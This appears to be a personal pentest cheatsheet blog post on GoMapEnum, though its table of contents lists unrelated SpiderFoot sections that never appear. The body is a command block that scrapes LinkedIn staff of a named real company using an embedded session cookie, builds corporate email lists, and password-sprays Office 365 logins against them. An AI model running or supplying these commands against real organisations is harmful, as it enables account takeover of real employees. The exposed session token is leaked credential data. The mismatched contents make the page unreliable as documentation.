---
layout: post
title: GoMapEnum Cheatsheet 
parent: OSINT
category: OSINT
grand_parent: Cheatsheets
modified_date: 2021-11-23
permalink: /:categories/:title/
---
<!-- vscode-markdown-toc -->
* 1. [SpiderFoot Install](#SpiderFootInstall)
* 2. [SFCLI \ Execution](#SFCLIExecution)
* 3. [SFCLI \ Getting Started](#SFCLIGettingStarted)
* 4. [SFCLI \ Module Shodan](#SFCLIModuleShodan)
* 5. [SFCLI \ Module HaveIBeenPwned](#SFCLIModuleHaveIBeenPwned)
* 6. [SFCLI \ Module DNSrecon](#SFCLIModuleDNSrecon)
* 7. [SFCLI \ Module CRT](#SFCLIModuleCRT)
* 8. [SFCLI \ Module whatcms](#SFCLIModulewhatcms)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

##  1. <a name='SpiderFootInstall'></a>SpiderFoot Install
- [Sysadmin Docker Cheatsheet](/sysadmin/2021/10/26/sys-cli-docker.html)
```
sudo docker run -it 065ac3b1a78f -v /home/jomivz/git/TO-BKP:/mnt
apk add git
git clone  https://github.com/nodauf/GoMapEnum.git
cd GoMapEnum/
go run src/main.go gather linkedin -c "luxottica retail" -s AQEDAQFOIcQFIdfNAAABfZokKwIAAAF9vjCvAk0AW4qE0Ucp85IDX9Qc_5QCWGvwXZCA1BRbDhjFl4lGaBgkp6JXoCZ488MZu9XK1HnhG4jc7wTxwzdpQAOHCutZbJckZiEwJP7ZdV7gUS7A5XAPmcax -f {f}{last}i@luxotticaretail.com -o /mnt/luxor_users.txt
go run src/main.go gather linkedin -c luxottica -s AQEDAQFOIcQFIdfNAAABfZokKwIAAAF9vjCvAk0AW4qE0Ucp85IDX9Qc_5QCWGvwXZCA1BRbDhjFl4lGaBgkp6JXoCZ488MZu9XK1HnhG4jc7wTxwzdpQAOHCutZbJckZiEwJP7ZdV7gUS7A5XAPmcax -f {first}.{last}i@luxottica.com -o /mnt/luxo_users.txt
go run src/main.go bruteSpray o365 -u /mnt/luxor_users.txt  -p /mnt/pass.txt -l 2
go run src/main.go bruteSpray o365 -u /mnt/luxo_users.txt  -p /mnt/pass.txt -l 2

```
